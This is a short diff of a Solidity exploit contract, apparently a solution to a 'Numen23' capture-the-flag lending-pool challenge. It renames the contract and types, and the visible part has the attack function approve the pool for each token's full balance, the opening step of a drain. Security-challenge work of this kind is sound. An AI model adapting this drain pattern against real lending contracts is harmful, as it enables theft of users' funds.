@@ -1,15 +1,15 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.16;
-import "./lenderPool.sol";
+import "./LenderPool.sol";
 
-contract LenderPoolAttack {
-    ERC20 public token0;
-    ERC20 public token1;
-    LenderPool public lp;
+contract LenderPoolNumen23Attack {
+    ERC20Numen23 public token0;
+    ERC20Numen23 public token1;
+    LenderPoolNumen23 public lp;
     function attack(address target) public {
-        lp = LenderPool(target);
-        token0 = ERC20(address(lp.token0()));
-        token1 = ERC20(address(lp.token1()));
+        lp = LenderPoolNumen23(target);
+        token0 = ERC20Numen23(address(lp.token0()));
+        token1 = ERC20Numen23(address(lp.token1()));
 
         token0.approve(address(target), token0.balanceOf(address(lp)));
         token1.approve(address(target), token1.balanceOf(address(lp)));
